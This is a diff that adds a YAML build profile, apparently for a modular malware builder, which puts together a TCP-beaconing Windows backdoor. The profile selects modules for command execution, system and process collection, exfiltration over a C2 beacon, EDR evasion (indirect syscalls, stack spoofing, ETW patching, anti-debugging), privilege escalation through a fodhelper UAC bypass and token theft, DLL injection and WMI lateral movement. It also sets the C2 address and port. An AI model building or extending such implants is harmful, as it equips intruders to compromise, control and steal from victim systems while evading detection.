@@ -1,0 +1,35 @@
+name: backdoor_cs_tcp_postex_v1
+description: TCP beacon backdoor with post-exploitation (privesc, lateral, injection)
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+collectors:
+  - collectors/system_info
+  - collectors/processes
+exfil: c2/tcp_beacon
+arch: arch/backdoor
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+  - evasion/indirect_syscall
+  - evasion/stack_spoof
+  - evasion/etw_patch
+  - evasion/anti_debug
+  - privesc/uac_fodhelper
+  - privesc/token_steal
+  - privesc/getsystem_pipe
+  - injection/dll_inject
+  - lateral/wmi_exec
+commands:
+  - commands/cmd_sysinfo
+  - commands/cmd_processes
+  - commands/cmd_exec
+  - commands/cmd_getsystem
+  - commands/cmd_uac_bypass
+  - commands/cmd_token
+  - commands/cmd_inject
+  - commands/cmd_lateral
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
